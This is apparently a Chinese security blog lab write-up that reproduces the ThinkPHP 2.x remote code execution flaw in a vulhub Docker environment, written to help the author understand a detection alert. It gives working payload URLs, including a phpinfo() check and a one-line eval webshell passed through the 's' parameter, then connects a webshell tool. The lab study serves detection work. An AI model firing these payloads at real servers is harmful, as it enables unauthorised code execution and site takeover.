ailx10说：这篇是2024年4月之前写的，后来又改过。这篇不是毫无来由地挑了个旧框架刷题，而是前几天在检测里看到一条 ThinkPHP2 的利用行为，索性搭环境自己试一遍。先用有明显输出的调用确认入口，再往后用 POST 参数连接工具，告警里的字符串才慢慢有了具体含义。我把请求和复现过程记下来，方便以后研判时少一点凭印象猜测。它属于历史版本实验，里面一些 PHP 写法也带着当年的环境特点，不能把跑通的旧语法直接照搬到现在。

---

```
GET //?s=/aa/bb/name/${@print(md5(chaonan))} HTTP/1.1
```

实验过程如下：

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明thinkphp2.x任意代码执行漏洞环境搭建成功了

![](/notes-assets/c03523f5cea1a15e5c06.webp)

基于查询报错查看版本，确认是ThinkPHP2.1

![](/notes-assets/0e98cf3767fe247eb28b.webp)

访问，验证存在漏洞

```
http://144.34.162.13:8080/?s=/index/index/name/${@phpinfo()}
```

![](/notes-assets/ad74aca52af292567658.webp)

使用蚁剑，连接一句话木马

```
http://144.34.162.13:8080/?s=a/b/c/${@print(eval($_POST[ailx10]))}
```

![](/notes-assets/7079189bc10a7d31220a.webp)

进入webshell

![](/notes-assets/ffcae5d88b7b3ce14bbc.webp)

从巡检线索走到本地观察，比只收藏一条POC多了一段理解。把具体版本和参数路径留下，以后遇到相似告警时，才知道该核实什么而不只是照着重放。
